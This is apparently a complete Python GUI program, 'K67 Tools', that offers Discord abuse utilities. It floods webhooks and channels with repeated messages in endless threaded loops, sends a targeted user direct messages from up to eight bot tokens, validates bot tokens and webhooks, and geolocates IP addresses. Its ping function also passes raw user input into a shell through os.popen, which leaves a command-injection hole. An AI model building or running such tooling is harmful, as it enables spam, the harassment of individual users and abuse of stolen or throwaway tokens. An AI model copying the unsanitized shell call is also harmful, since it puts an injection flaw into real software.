import os
import random
import platform
import requests
import threading
import time
import customtkinter as ctk
from PIL import Image
import json
from tkinter import scrolledtext
import webbrowser

# Set appearance mode and default color theme
ctk.set_appearance_mode("System")  # Modes: "System" (standard), "Dark", "Light"
ctk.set_default_color_theme("blue")  # Themes: "blue" (standard), "green", "dark-blue"

class RedirectText:
    def __init__(self, text_widget):
        self.text_widget = text_widget
        self.buffer = ""

    def write(self, string):
        self.buffer += string
        self.text_widget.configure(state="normal")
        self.text_widget.insert("end", string)
        self.text_widget.see("end")
        self.text_widget.configure(state="disabled")

    def flush(self):
        pass

class ScrollableFrame(ctk.CTkScrollableFrame):
    def __init__(self, master, **kwargs):
        super().__init__(master, **kwargs)
        self.grid_columnconfigure(0, weight=1)

class ToolFunction:
    @staticmethod
    def safe_request(url, method="GET", data=None, headers=None):
        """Wrapper for sending HTTP requests with error handling."""
        try:
            if method.upper() == "POST":
                response = requests.post(url, json=data, headers=headers)
            else:
                response = requests.get(url, headers=headers)
            
            response.raise_for_status()
            return response
        except requests.RequestException as e:
            return None

    @staticmethod
    def ip_lookup(ip, output_text):
        if not ip:
            output_text.write("Error: IP address is required.\n")
            return

        url = f"http://ip-api.com/json/{ip}"
        data = ToolFunction.safe_request(url)
        if not data:
            output_text.write("Error: Request failed.\n")
            return

        data = data.json()
        if data.get("status") == "fail":
            output_text.write("Invalid IP address or lookup failed.\n")
            return

        output_text.write("\nIP Lookup Results:\n")
        output_text.write(f"IP: {data['query']}\n")
        output_text.write(f"Country: {data['country']}\n")
        output_text.write(f"Region: {data['regionName']}\n")
        output_text.write(f"City: {data['city']}\n")
        output_text.write(f"ZIP Code: {data['zip']}\n")
        output_text.write(f"ISP: {data['isp']}\n")
        output_text.write(f"Latitude: {data['lat']}\n")
        output_text.write(f"Longitude: {data['lon']}\n")

    @staticmethod
    def generate_ip(output_text):
        ip = f"192.168.{random.randint(0, 255)}.{random.randint(0, 255)}"
        output_text.write(f"Generated IP: {ip}\n")
        return ip

    @staticmethod
    def ping_ip(ip, output_text):
        if not ip:
            output_text.write("Error: IP address is required.\n")
            return

        param = "-n" if platform.system().lower() == "windows" else "-c"
        command = f"ping {param} 4 {ip}"
        output_text.write(f"Running: {command}\n")
        
        # Use os.popen to capture the output
        stream = os.popen(command)
        output = stream.read()
        output_text.write(output)
        
        if stream.close() is None:  # exit status is None if successful
            output_text.write(f"IP {ip} is reachable.\n")
        else:
            output_text.write(f"IP {ip} is not reachable.\n")

    @staticmethod
    def check_webhook(webhook_url, output_text):
        if not webhook_url:
            output_text.write("Error: Webhook URL is required.\n")
            return

        response = ToolFunction.safe_request(webhook_url)
        if not response:
            output_text.write("Error: Request failed.\n")
            return

        if response.status_code == 200:
            output_text.write("Webhook is valid.\n")
        else:
            output_text.write(f"Webhook is invalid. Status Code: {response.status_code}\n")

    @staticmethod
    def check_token(token, output_text):
        if not token:
            output_text.write("Error: Discord Bot Token is required.\n")
            return

        url = "https://discord.com/api/v9/users/@me"
        headers = {"Authorization": f"Bot {token}"}

        response = ToolFunction.safe_request(url, headers=headers)
        if not response:
            output_text.write("Error: Request failed.\n")
            return

        if response.status_code == 200:
            user_data = response.json()
            output_text.write("Token is valid.\n")
            if 'discriminator' in user_data:
                output_text.write(f"Bot Username: {user_data['username']}#{user_data['discriminator']}\n")
            else:
                output_text.write(f"Bot Username: {user_data['username']}\n")
            output_text.write(f"Bot ID: {user_data['id']}\n")
        else:
            output_text.write(f"Invalid token. Status Code: {response.status_code}\n")

    @staticmethod
    def spam_webhook(webhook_url, message, output_text, stop_event):
        if not webhook_url or not message:
            output_text.write("Error: Webhook URL and message are required.\n")
            return

        def spam_thread():
            count = 0
            while not stop_event.is_set():
                try:
                    response = requests.post(webhook_url, json={"content": message})
                    response.raise_for_status()
                    count += 1
                    output_text.write(f"Message sent ({count})\n")
                    time.sleep(0.5)  # Prevent rate limiting
                except requests.RequestException as e:
                    output_text.write(f"Error: {e}\n")
                    break

        threading.Thread(target=spam_thread, daemon=True).start()

    @staticmethod
    def spam_token(token, channel_id, message, output_text, stop_event):
        if not token or not channel_id or not message:
            output_text.write("Error: Bot Token, Channel ID, and message are required.\n")
            return

        def token_thread():
            headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
            url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
            count = 0
            while not stop_event.is_set():
                try:
                    response = requests.post(url, headers=headers, json={"content": message})
                    response.raise_for_status()
                    count += 1
                    output_text.write(f"Message sent ({count})\n")
                    time.sleep(0.5)  # Prevent rate limiting
                except requests.RequestException as e:
                    output_text.write(f"Error: {e}\n")
                    break

        threading.Thread(target=token_thread, daemon=True).start()

    @staticmethod
    def send_dm_to_user(user_id, message, tokens, output_text, stop_event):
        if not user_id or not message:
            output_text.write("Error: User ID and message are required.\n")
            return

        if not tokens:
            output_text.write("Error: No tokens provided.\n")
            return

        url = "https://discord.com/api/v9/users/@me/channels"

        def send_message(bot_token):
            headers = {"Authorization": f"Bot {bot_token}", "Content-Type": "application/json"}

            response = requests.post(url, headers=headers, json={"recipient_id": user_id})
            if response.status_code == 200:
                dm_channel = response.json().get("id")
                if not dm_channel:
                    output_text.write(f"Failed to open DM channel with user {user_id} using token {bot_token[:10]}...\n")
                    return

                message_url = f"https://discord.com/api/v9/channels/{dm_channel}/messages"
                count = 0
                try:
                    while not stop_event.is_set() and count < 20:  # Limit to 20 messages
                        response = requests.post(message_url, headers=headers, json={"content": message})
                        if response.status_code == 200:
                            count += 1
                            output_text.write(f"DM sent ({count}) to user {user_id} using token {bot_token[:10]}...\n")
                        else:
                            output_text.write(f"Failed to send DM: {response.status_code} - {response.text}\n")
                        time.sleep(1)  # Prevent rate limiting
                except Exception as e:
                    output_text.write(f"Error sending DM: {e}\n")
            else:
                output_text.write(f"Could not open DM with user {user_id}. Status code: {response.status_code}\n")

        threads = []
        for token in tokens:
            thread = threading.Thread(target=send_message, args=(token,))
            threads.append(thread)
            thread.start()

class K67ToolsApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.stop_event = threading.Event()
        
        self.title("K67 Tools")
        self.geometry("1000x700")
        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)
        
        self.main_frame = ctk.CTkFrame(self)
        self.main_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        self.main_frame.grid_columnconfigure(0, weight=1)
        self.main_frame.grid_columnconfigure(1, weight=3)
        self.main_frame.grid_rowconfigure(0, weight=0)  # Title
        self.main_frame.grid_rowconfigure(1, weight=1)  # Content

        self.title_label = ctk.CTkLabel(
            self.main_frame, 
            text="K67 Tools",
            font=ctk.CTkFont(size=24, weight="bold")
        )
        self.title_label.grid(row=0, column=0, columnspan=2, pady=(10, 20))

        self.sidebar = ctk.CTkFrame(self.main_frame)
        self.sidebar.grid(row=1, column=0, sticky="nsew", padx=10, pady=10)
        self.sidebar.grid_rowconfigure(10, weight=1)  # Push last item to bottom

        self.tools = [
            {"name": "IP Lookup", "func": self.show_ip_lookup},
            {"name": "Generate IP", "func": self.show_generate_ip},
            {"name": "Ping IP", "func": self.show_ping_ip},
            {"name": "Spam Webhook", "func": self.show_spam_webhook},
            {"name": "Spam Bot Messages", "func": self.show_spam_token},
            {"name": "Check Webhook", "func": self.show_check_webhook},
            {"name": "Check Token", "func": self.show_check_token},
            {"name": "Send DMs", "func": self.show_send_dm},
            {"name": "Credits", "func": self.show_credits}
        ]
        
        for i, tool in enumerate(self.tools):
            btn = ctk.CTkButton(
                self.sidebar,
                text=tool["name"],
                command=tool["func"],
                height=40,
                width=180
            )
            btn.grid(row=i, column=0, pady=5, padx=10, sticky="ew")
            
        self.appearance_mode_label = ctk.CTkLabel(self.sidebar, text="Appearance Mode:")
        self.appearance_mode_label.grid(row=9, column=0, pady=(20, 0))
        self.appearance_mode_dropdown = ctk.CTkOptionMenu(
            self.sidebar, 
            values=["System", "Light", "Dark"],
            command=self.change_appearance_mode
        )
        self.appearance_mode_dropdown.grid(row=10, column=0, pady=10, padx=10, sticky="ew")
        
        self.content_frame = ctk.CTkFrame(self.main_frame)
        self.content_frame.grid(row=1, column=1, sticky="nsew", padx=10, pady=10)
        self.content_frame.grid_rowconfigure(0, weight=1)
        self.content_frame.grid_columnconfigure(0, weight=1)
        
        self.output_frame = ctk.CTkFrame(self.content_frame)
        self.output_frame.grid(row=1, column=0, sticky="nsew", padx=10, pady=10)
        self.output_frame.grid_columnconfigure(0, weight=1)
        self.output_frame.grid_rowconfigure(0, weight=0)
        self.output_frame.grid_rowconfigure(1, weight=1)
        
        self.output_label = ctk.CTkLabel(self.output_frame, text="Output:")
        self.output_label.grid(row=0, column=0, sticky="w", pady=(5, 0))
        
        self.output_text = scrolledtext.ScrolledText(self.output_frame, wrap="word", height=10)
        self.output_text.grid(row=1, column=0, sticky="nsew", pady=5)
        self.output_text.configure(state="disabled")
        
        self.redirect = RedirectText(self.output_text)
        
        self.stop_button = ctk.CTkButton(
            self.output_frame,
            text="Stop Operation",
            command=self.stop_operation,
            fg_color="red",
            hover_color="darkred"
        )
        self.stop_button.grid(row=2, column=0, pady=5)
        
        self.current_tool_frame = None
        self.show_ip_lookup()

    def remove_current_tool_frame(self):
        if self.current_tool_frame:
            self.current_tool_frame.destroy()
    
    def stop_operation(self):
        self.stop_event.set()
        self.redirect.write("Operation stopped.\n")
        self.after(500, lambda: self.stop_event.clear())
        
    def change_appearance_mode(self, new_appearance_mode):
        ctk.set_appearance_mode(new_appearance_mode)

    def show_ip_lookup(self):
        self.remove_current_tool_frame()
        self.current_tool_frame = ctk.CTkFrame(self.content_frame)
        self.current_tool_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        self.current_tool_frame.grid_columnconfigure(0, weight=1)
        
        title = ctk.CTkLabel(
            self.current_tool_frame, 
            text="IP Lookup",
            font=ctk.CTkFont(size=20, weight="bold")
        )
        title.grid(row=0, column=0, padx=20, pady=(20, 10), sticky="w")
        
        desc = ctk.CTkLabel(
            self.current_tool_frame, 
            text="Look up information about an IP address",
            font=ctk.CTkFont(size=14)
        )
        desc.grid(row=1, column=0, padx=20, pady=(0, 20), sticky="w")
        
        form_frame = ctk.CTkFrame(self.current_tool_frame)
        form_frame.grid(row=2, column=0, padx=20, pady=10, sticky="ew")
        form_frame.grid_columnconfigure(1, weight=1)
        
        ip_label = ctk.CTkLabel(form_frame, text="IP Address:")
        ip_label.grid(row=0, column=0, padx=10, pady=10, sticky="w")
        
        ip_entry = ctk.CTkEntry(form_frame, width=300)
        ip_entry.grid(row=0, column=1, padx=10, pady=10, sticky="ew")
        
        submit_btn = ctk.CTkButton(
            form_frame, 
            text="Lookup",
            command=lambda: ToolFunction.ip_lookup(ip_entry.get(), self.redirect)
        )
        submit_btn.grid(row=1, column=0, columnspan=2, padx=10, pady=20)

    def show_generate_ip(self):
        self.remove_current_tool_frame()
        self.current_tool_frame = ctk.CTkFrame(self.content_frame)
        self.current_tool_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        self.current_tool_frame.grid_columnconfigure(0, weight=1)
        
        title = ctk.CTkLabel(
            self.current_tool_frame, 
            text="Generate IP",
            font=ctk.CTkFont(size=20, weight="bold")
        )
        title.grid(row=0, column=0, padx=20, pady=(20, 10), sticky="w")
        
        desc = ctk.CTkLabel(
            self.current_tool_frame, 
            text="Generate a random IP address",
            font=ctk.CTkFont(size=14)
        )
        desc.grid(row=1, column=0, padx=20, pady=(0, 20), sticky="w")
        
        generate_btn = ctk.CTkButton(
            self.current_tool_frame, 
            text="Generate IP",
            command=lambda: ToolFunction.generate_ip(self.redirect)
        )
        generate_btn.grid(row=2, column=0, padx=20, pady=20)

    def show_ping_ip(self):
        self.remove_current_tool_frame()
        self.current_tool_frame = ctk.CTkFrame(self.content_frame)
        self.current_tool_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        self.current_tool_frame.grid_columnconfigure(0, weight=1)
        
        title = ctk.CTkLabel(
            self.current_tool_frame, 
            text="Ping IP",
            font=ctk.CTkFont(size=20, weight="bold")
        )
        title.grid(row=0, column=0, padx=20, pady=(20, 10), sticky="w")
        
        desc = ctk.CTkLabel(
            self.current_tool_frame, 
            text="Ping an IP address to check if it's reachable",
            font=ctk.CTkFont(size=14)
        )
        desc.grid(row=1, column=0, padx=20, pady=(0, 20), sticky="w")
        
        form_frame = ctk.CTkFrame(self.current_tool_frame)
        form_frame.grid(row=2, column=0, padx=20, pady=10, sticky="ew")
        form_frame.grid_columnconfigure(1, weight=1)
        
        ip_label = ctk.CTkLabel(form_frame, text="IP Address:")
        ip_label.grid(row=0, column=0, padx=10, pady=10, sticky="w")
        
        ip_entry = ctk.CTkEntry(form_frame, width=300)
        ip_entry.grid(row=0, column=1, padx=10, pady=10, sticky="ew")
        
        submit_btn = ctk.CTkButton(
            form_frame, 
            text="Ping",
            command=lambda: ToolFunction.ping_ip(ip_entry.get(), self.redirect)
        )
        submit_btn.grid(row=1, column=0, columnspan=2, padx=10, pady=20)

    def show_spam_webhook(self):
        self.remove_current_tool_frame()
        self.current_tool_frame = ctk.CTkFrame(self.content_frame)
        self.current_tool_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        self.current_tool_frame.grid_columnconfigure(0, weight=1)
        
        title = ctk.CTkLabel(
            self.current_tool_frame, 
            text="Spam Discord Webhook",
            font=ctk.CTkFont(size=20, weight="bold")
        )
        title.grid(row=0, column=0, padx=20, pady=(20, 10), sticky="w")
        
        desc = ctk.CTkLabel(
            self.current_tool_frame, 
            text="Send repeated messages to a Discord webhook",
            font=ctk.CTkFont(size=14)
        )
        desc.grid(row=1, column=0, padx=20, pady=(0, 20), sticky="w")
        
        form_frame = ctk.CTkFrame(self.current_tool_frame)
        form_frame.grid(row=2, column=0, padx=20, pady=10, sticky="ew")
        form_frame.grid_columnconfigure(1, weight=1)
        
        webhook_label = ctk.CTkLabel(form_frame, text="Webhook URL:")
        webhook_label.grid(row=0, column=0, padx=10, pady=10, sticky="w")
        
        webhook_entry = ctk.CTkEntry(form_frame, width=300)
        webhook_entry.grid(row=0, column=1, padx=10, pady=10, sticky="ew")
        
        message_label = ctk.CTkLabel(form_frame, text="Message:")
        message_label.grid(row=1, column=0, padx=10, pady=10, sticky="w")
        
        message_entry = ctk.CTkEntry(form_frame, width=300)
        message_entry.grid(row=1, column=1, padx=10, pady=10, sticky="ew")
        
        submit_btn = ctk.CTkButton(
            form_frame, 
            text="Start Spamming",
            command=lambda: ToolFunction.spam_webhook(
                webhook_entry.get(), 
                message_entry.get(), 
                self.redirect,
                self.stop_event
            )
        )
        submit_btn.grid(row=2, column=0, columnspan=2, padx=10, pady=20)
        
    def show_spam_token(self):
        self.remove_current_tool_frame()
        self.current_tool_frame = ctk.CTkFrame(self.content_frame)
        self.current_tool_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        self.current_tool_frame.grid_columnconfigure(0, weight=1)
        
        title = ctk.CTkLabel(
            self.current_tool_frame, 
            text="Spam Discord Bot Messages",
            font=ctk.CTkFont(size=20, weight="bold")
        )
        title.grid(row=0, column=0, padx=20, pady=(20, 10), sticky="w")
        
        desc = ctk.CTkLabel(
            self.current_tool_frame, 
            text="Send repeated messages using a Discord bot token",
            font=ctk.CTkFont(size=14)
        )
        desc.grid(row=1, column=0, padx=20, pady=(0, 20), sticky="w")
        
        form_frame = ctk.CTkFrame(self.current_tool_frame)
        form_frame.grid(row=2, column=0, padx=20, pady=10, sticky="ew")
        form_frame.grid_columnconfigure(1, weight=1)
        
        token_label = ctk.CTkLabel(form_frame, text="Bot Token:")
        token_label.grid(row=0, column=0, padx=10, pady=10, sticky="w")
        
        token_entry = ctk.CTkEntry(form_frame, width=300)
        token_entry.grid(row=0, column=1, padx=10, pady=10, sticky="ew")
        
        channel_label = ctk.CTkLabel(form_frame, text="Channel ID:")
        channel_label.grid(row=1, column=0, padx=10, pady=10, sticky="w")
        
        channel_entry = ctk.CTkEntry(form_frame, width=300)
        channel_entry.grid(row=1, column=1, padx=10, pady=10, sticky="ew")
        
        message_label = ctk.CTkLabel(form_frame, text="Message:")
        message_label.grid(row=2, column=0, padx=10, pady=10, sticky="w")
        
        message_entry = ctk.CTkEntry(form_frame, width=300)
        message_entry.grid(row=2, column=1, padx=10, pady=10, sticky="ew")
        
        submit_btn = ctk.CTkButton(
            form_frame, 
            text="Start Spamming",
            command=lambda: ToolFunction.spam_token(
                token_entry.get(), 
                channel_entry.get(), 
                message_entry.get(), 
                self.redirect,
                self.stop_event
            )
        )
        submit_btn.grid(row=3, column=0, columnspan=2, padx=10, pady=20)
        
    def show_check_webhook(self):
        self.remove_current_tool_frame()
        self.current_tool_frame = ctk.CTkFrame(self.content_frame)
        self.current_tool_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        self.current_tool_frame.grid_columnconfigure(0, weight=1)
        
        title = ctk.CTkLabel(
            self.current_tool_frame, 
            text="Check Webhook Validity",
            font=ctk.CTkFont(size=20, weight="bold")
        )
        title.grid(row=0, column=0, padx=20, pady=(20, 10), sticky="w")
        
        desc = ctk.CTkLabel(
            self.current_tool_frame, 
            text="Check if a Discord webhook is valid",
            font=ctk.CTkFont(size=14)
        )
        desc.grid(row=1, column=0, padx=20, pady=(0, 20), sticky="w")
        
        form_frame = ctk.CTkFrame(self.current_tool_frame)
        form_frame.grid(row=2, column=0, padx=20, pady=10, sticky="ew")
        form_frame.grid_columnconfigure(1, weight=1)
        
        webhook_label = ctk.CTkLabel(form_frame, text="Webhook URL:")
        webhook_label.grid(row=0, column=0, padx=10, pady=10, sticky="w")
        
        webhook_entry = ctk.CTkEntry(form_frame, width=300)
        webhook_entry.grid(row=0, column=1, padx=10, pady=10, sticky="ew")
        
        submit_btn = ctk.CTkButton(
            form_frame, 
            text="Check Webhook",
            command=lambda: ToolFunction.check_webhook(webhook_entry.get(), self.redirect)
        )
        submit_btn.grid(row=1, column=0, columnspan=2, padx=10, pady=20)
        
    def show_check_token(self):
        self.remove_current_tool_frame()
        self.current_tool_frame = ctk.CTkFrame(self.content_frame)
        self.current_tool_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        self.current_tool_frame.grid_columnconfigure(0, weight=1)
        
        title = ctk.CTkLabel(
            self.current_tool_frame, 
            text="Check Discord Bot Token",
            font=ctk.CTkFont(size=20, weight="bold")
        )
        title.grid(row=0, column=0, padx=20, pady=(20, 10), sticky="w")
        
        desc = ctk.CTkLabel(
            self.current_tool_frame, 
            text="Check if a Discord bot token is valid",
            font=ctk.CTkFont(size=14)
        )
        desc.grid(row=1, column=0, padx=20, pady=(0, 20), sticky="w")
        
        form_frame = ctk.CTkFrame(self.current_tool_frame)
        form_frame.grid(row=2, column=0, padx=20, pady=10, sticky="ew")
        form_frame.grid_columnconfigure(1, weight=1)
        
        token_label = ctk.CTkLabel(form_frame, text="Bot Token:")
        token_label.grid(row=0, column=0, padx=10, pady=10, sticky="w")
        
        token_entry = ctk.CTkEntry(form_frame, width=300)
        token_entry.grid(row=0, column=1, padx=10, pady=10, sticky="ew")
        
        submit_btn = ctk.CTkButton(
            form_frame, 
            text="Check Token",
            command=lambda: ToolFunction.check_token(token_entry.get(), self.redirect)
        )
        submit_btn.grid(row=1, column=0, columnspan=2, padx=10, pady=20)
        
    def show_send_dm(self):
        self.remove_current_tool_frame()
        self.current_tool_frame = ctk.CTkFrame(self.content_frame)
        self.current_tool_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        self.current_tool_frame.grid_columnconfigure(0, weight=1)
        
        title = ctk.CTkLabel(
            self.current_tool_frame, 
            text="Send DMs with Multiple Bots",
            font=ctk.CTkFont(size=20, weight="bold")
        )
        title.grid(row=0, column=0, padx=20, pady=(20, 10), sticky="w")
        
        desc = ctk.CTkLabel(
            self.current_tool_frame, 
            text="Send Direct Messages to a user using multiple bot tokens",
            font=ctk.CTkFont(size=14)
        )
        desc.grid(row=1, column=0, padx=20, pady=(0, 20), sticky="w")
        
        form_frame = ScrollableFrame(self.current_tool_frame, width=400, height=300)
        form_frame.grid(row=2, column=0, padx=20, pady=10, sticky="nsew")
        
        user_id_label = ctk.CTkLabel(form_frame, text="User ID:")
        user_id_label.grid(row=0, column=0, padx=10, pady=10, sticky="w")
        
        user_id_entry = ctk.CTkEntry(form_frame, width=300)
        user_id_entry.grid(row=0, column=1, padx=10, pady=10, sticky="ew")
        
        message_label = ctk.CTkLabel(form_frame, text="Message:")
        message_label.grid(row=1, column=0, padx=10, pady=10, sticky="w")
        
        message_entry = ctk.CTkEntry(form_frame, width=300)
        message_entry.grid(row=1, column=1, padx=10, pady=10, sticky="ew")
        
        token_entries = []
        
        token_header = ctk.CTkLabel(form_frame, text="Bot Tokens (add up to 8):")
        token_header.grid(row=2, column=0, columnspan=2, padx=10, pady=(20, 10), sticky="w")
        
        for i in range(8):
            token_label = ctk.CTkLabel(form_frame, text=f"Token {i+1}:")
            token_label.grid(row=i+3, column=0, padx=10, pady=5, sticky="w")
            
            token_entry = ctk.CTkEntry(form_frame, width=300)
            token_entry.grid(row=i+3, column=1, padx=10, pady=5, sticky="ew")
            token_entries.append(token_entry)
        
        submit_btn = ctk.CTkButton(
            form_frame, 
            text="Send DMs",
            command=lambda: ToolFunction.send_dm_to_user(
                user_id_entry.get(),
                message_entry.get(),
                [e.get() for e in token_entries if e.get()],
                self.redirect,
                self.stop_event
            )
        )
        submit_btn.grid(row=12, column=0, columnspan=2, padx=10, pady=20)
        
    def show_credits(self):
        self.remove_current_tool_frame()
        self.current_tool_frame = ctk.CTkFrame(self.content_frame)
        self.current_tool_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
        self.current_tool_frame.grid_columnconfigure(0, weight=1)
        
        title = ctk.CTkLabel(
            self.current_tool_frame, 
            text="Credits",
            font=ctk.CTkFont(size=20, weight="bold")
        )
        title.grid(row=0, column=0, padx=20, pady=(20, 10), sticky="w")
        
        ascii_art = """
        CU7N     
        """
        
        art_label = ctk.CTkLabel(
            self.current_tool_frame, 
            text=ascii_art,
            font=ctk.CTkFont(family="Courier", size=12),
            justify="left"
        )
        art_label.grid(row=1, column=0, padx=20, pady=10)
        
        creator_frame = ctk.CTkFrame(self.current_tool_frame)
        creator_frame.grid(row=2, column=0, padx=20, pady=10, sticky="ew")
        
        creator_label = ctk.CTkLabel(
            creator_frame, 
            text="Created by cu7n",
            font=ctk.CTkFont(size=16, weight="bold")
        )
        creator_label.grid(row=0, column=0, padx=20, pady=10)
        
        profile_btn = ctk.CTkButton(
            creator_frame,
            text="Visit Profile",
            command=lambda: webbrowser.open("https://guns.lol/cu7n")
        )
        profile_btn.grid(row=1, column=0, padx=20, pady=10)
        
        tech_frame = ctk.CTkFrame(self.current_tool_frame)
        tech_frame.grid(row=3, column=0, padx=20, pady=10, sticky="ew")
        
        tech_label = ctk.CTkLabel(
            tech_frame, 
            text="I used for this tool",
            font=ctk.CTkFont(size=16, weight="bold")
        )
        tech_label.grid(row=0, column=0, padx=20, pady=10)
        
        tech_list = ctk.CTkLabel(
            tech_frame, 
            text="Python, CustomTkinter, Requests",
            font=ctk.CTkFont(size=14)
        )
        tech_list.grid(row=1, column=0, padx=20, pady=10)

if __name__ == "__main__":
    app = K67ToolsApp()
    app.mainloop()
